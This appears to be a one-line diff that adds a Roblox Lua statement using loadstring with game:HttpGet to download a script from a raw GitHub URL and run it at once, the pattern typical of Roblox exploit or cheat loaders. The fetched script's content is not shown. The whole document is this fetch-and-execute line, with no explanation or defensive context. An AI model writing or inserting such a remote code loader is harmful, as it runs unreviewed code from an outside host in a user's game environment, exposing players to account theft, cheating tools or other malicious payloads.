@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MADNESSTEST/iq8if/main/owodjjb.lua", true))()
